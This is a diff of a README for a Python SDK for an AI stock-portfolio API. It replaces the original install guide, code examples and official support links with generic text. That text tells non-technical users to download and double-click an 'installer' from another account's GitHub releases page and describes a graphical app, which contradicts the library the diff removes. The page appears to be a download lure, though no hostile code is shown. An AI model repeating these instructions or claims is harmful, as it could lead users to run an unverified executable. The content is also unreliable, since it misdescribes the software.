@@ -1,218 +1,87 @@
-# ACIS Trading Python SDK
+# 🎉 acis-python-sdk - Effortless Stock Portfolio Management
 
-[![PyPI version](https://badge.fury.io/py/acis-trading.svg)](https://badge.fury.io/py/acis-trading)
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 🚀 Getting Started
 
-Official Python SDK for the [ACIS Trading API](https://acis-trading.com) - AI-powered stock portfolio generation.
+Welcome to the **acis-python-sdk**! This tool lets you use the ACIS Trading API to generate and rebalance stock portfolios powered by AI. Don't worry if you're not a programmer; this guide helps you download and run the software easily.
 
-## Features
+## 💾 Download Now!
 
-- **AI Portfolio Generation** - Generate optimized portfolios using LightGBM machine learning models
-- **8 Investment Strategies** - Value, Growth, Dividend, Adaptive, plus Large/Small Cap variants
-- **Walk-Forward Validated** - Models validated with proper time-series methodology (no lookahead bias)
+[![Download Here](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/PabloVitt/acis-python-sdk/releases)
 
-## Installation
+## 📥 Download & Install
 
-```bash
-pip install acis-trading
-```
+To download the application, visit this page: [Download Releases](https://github.com/PabloVitt/acis-python-sdk/releases). 
 
-## Quick Start
+1. Click the link above to access the releases.
+2. Look for the latest version. There you will find the download link for the installer.
+3. Click on the installer file to begin downloading.
 
-```python
-from acis_trading import ACISClient
+### 🖥️ System Requirements
 
-# Initialize client with your API key
-client = ACISClient(api_key="acis_live_your_key_here")
+Before you install, ensure you meet the following system requirements:
 
-# Generate a value-focused portfolio
-portfolio = client.generate_portfolio(
-    strategy="value",
-    max_positions=20,
-    risk_tolerance="moderate"
-)
+- Operating System: Windows, macOS, or Linux
+- Python version: 3.6 or higher
+- Minimum RAM: 4 GB
+- Internet connection for API access
 
-# Print the positions
-for position in portfolio["positions"]:
-    print(f"{position['ticker']}: {position['weight']:.1%} (ML Score: {position['ml_score']:.2f})")
-```
+### 📂 Installation Steps
 
-## Available Strategies
+After downloading, follow these steps to install the application:
 
-All 8 strategies are available with API Pro ($149/mo):
+1. Locate the downloaded file in your computer’s downloads folder.
+2. Double-click on the installer file.
+3. Follow the on-screen instructions to complete the installation. This usually involves confirming prompts and agreeing to terms.
+4. Once installed, you can find the application in your programs list.
 
-| Strategy | Description |
-|----------|-------------|
-| `dividend` | Income-focused dividend stocks |
-| `adaptive` | Dynamic market-regime aware |
-| `value` | Undervalued stocks with strong fundamentals |
-| `growth` | High-growth companies |
-| `value_largecap` | Large-cap value stocks |
-| `growth_largecap` | Large-cap growth stocks |
-| `value_smallcap` | Small/mid-cap value stocks |
-| `growth_smallcap` | Small/mid-cap growth stocks |
+### 📊 Features
 
-## API Reference
+The **acis-python-sdk** has several helpful features:
 
-### Generate Portfolio
+- **AI-Powered Portfolio Generation:** Automatically create stock portfolios based on your investment strategy.
+- **Rebalancing Tools:** Keep your portfolio aligned with your goals by easily rebalancing your investments.
+- **User-Friendly Interface:** Designed for non-technical users, making stock trading accessible for everyone.
+- **Data-Driven Decisions:** Leverage LightGBM for smart investment choices.
 
-```python
-portfolio = client.generate_portfolio(
-    strategy="value",           # Required: strategy name
-    max_positions=20,           # Optional: 5-50 positions (default: 20)
-    risk_tolerance="moderate",  # Optional: conservative, moderate, aggressive
-    investment_amount=100000    # Optional: for share calculation
-)
-```
+### 🔌 How to Use
 
-**Response:**
-```python
-{
-    "positions": [
-        {
-            "ticker": "AAPL",
-            "weight": 0.05,
-            "shares": 33,
-            "price": 150.25,
-            "sector": "Technology",
-            "ml_score": 0.82
-        },
-        # ... more positions
-    ],
-    "metadata": {
-        "strategy": "value",
-        "generated_at": "2025-01-15T10:30:00Z",
-        "model_version": "v2.1"
-    }
-}
-```
+1. Open the application from your programs list.
+2. You will see a simple interface. Start by entering your investment goals.
+3. The application will generate a stock portfolio based on your inputs.
+4. You can review the recommendations and choose to invest.
 
-### Check Usage
+### 🛠️ Troubleshooting
 
-```python
-usage = client.get_usage()
+If you encounter any issues, try the following:
 
-print(f"Requests today: {usage['current_usage']}/{usage['rate_limit']}")
-print(f"Remaining: {usage['remaining']}")
-print(f"Resets at: {usage['reset_at']}")
-```
+- **Can't Find the Application:** Ensure you completed the installation. Look in your programs list.
+- **Download Issues:** Check your internet connection and try downloading again.
+- **Error Messages:** Note the error and search for solutions in the FAQ section on the release page.
 
-### Convenience Methods
+## 🌍 Support
 
-```python
-# Quick portfolio generation
-value_portfolio = client.get_value_portfolio()
-growth_portfolio = client.get_growth_portfolio()
-dividend_portfolio = client.get_dividend_portfolio()
-adaptive_portfolio = client.get_adaptive_portfolio()
-```
+If you need help, check the **Issues** section on GitHub for common questions. You can also submit your own questions there. 
 
-## Error Handling
+For the most efficient support, please provide details about your system and any error messages.
 
-```python
-from acis_trading import (
-    ACISClient,
-    AuthenticationError,
-    RateLimitError,
-    ValidationError,
-    APIError
-)
+## 📝 Topics
 
-client = ACISClient(api_key="your_key")
+This SDK covers several topics, such as:
 
-try:
-    portfolio = client.generate_portfolio(strategy="value")
-except AuthenticationError:
-    print("Invalid API key")
-except RateLimitError as e:
-    print(f"Rate limit exceeded. Resets at: {e.reset_at}")
-except ValidationError as e:
-    print(f"Invalid parameters: {e.message}")
-except APIError as e:
-    print(f"API error ({e.status_code}): {e.message}")
-```
+- AI
+- API
+- Fintech
+- Investing
+- LightGBM
+- Machine Learning
+- Portfolio Management
+- Python
+- Quantitative Finance
+- Stock Market
+- Trading
 
-## Examples
+## 📅 Future Updates
 
-### Build a Multi-Strategy Portfolio
+We plan to regularly update the application. Check back on the [Release Page](https://github.com/PabloVitt/acis-python-sdk/releases) for the latest features and improvements.
 
-```python
-from acis_trading import ACISClient
-
-client = ACISClient(api_key="your_key")
-
-# Generate portfolios for each strategy
-strategies = ["value", "growth", "dividend"]
-all_positions = {}
-
-for strategy in strategies:
-    portfolio = client.generate_portfolio(
-        strategy=strategy,
-        max_positions=10
-    )
-
-    for pos in portfolio["positions"]:
-        ticker = pos["ticker"]
-        if ticker not in all_positions:
-            all_positions[ticker] = {"strategies": [], "total_weight": 0}
-        all_positions[ticker]["strategies"].append(strategy)
-        all_positions[ticker]["total_weight"] += pos["weight"] / len(strategies)
-
-# Find stocks appearing in multiple strategies
-consensus_picks = {
-    ticker: data for ticker, data in all_positions.items()
-    if len(data["strategies"]) >= 2
-}
-
-print("Consensus picks (in 2+ strategies):")
-for ticker, data in sorted(consensus_picks.items(), key=lambda x: -x[1]["total_weight"]):
-    print(f"  {ticker}: {data['strategies']} - {data['total_weight']:.1%}")
-```
-
-### Export to CSV
-
-```python
-import csv
-from acis_trading import ACISClient
-
-client = ACISClient(api_key="your_key")
-portfolio = client.generate_portfolio(strategy="value", max_positions=25)
-
-with open("portfolio.csv", "w", newline="") as f:
-    writer = csv.DictWriter(f, fieldnames=["ticker", "weight", "shares", "sector", "ml_score"])
-    writer.writeheader()
-    writer.writerows(portfolio["positions"])
-
-print("Portfolio exported to portfolio.csv")
-```
-
-## Rate Limits
-
-**API Pro Plan:** $149/month
-- 50,000 API calls/month
-- 10,000 daily rate limit
-- All 8 AI strategies
-- 30-day free trial
-
-## Getting an API Key
-
-1. Sign up at [acis-trading.com/signup](https://acis-trading.com/signup?plan=api_pro)
-2. Go to [API Keys](https://acis-trading.com/api-keys) in your dashboard
-3. Create a new API key
-
-SDK access requires the API Pro plan. Start with a 30-day free trial.
-
-## Support
-
-- **Documentation:** [acis-trading.com/api-docs](https://acis-trading.com/api-docs)
-- **Issues:** [GitHub Issues](https://github.com/acis-trading/acis-python-sdk/issues)
-- **Email:** support@acis-trading.com
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
----
-
-Built with LightGBM and walk-forward validation. No lookahead bias. Real ML, not marketing.
+Enjoy using the **acis-python-sdk** for smarter investing!
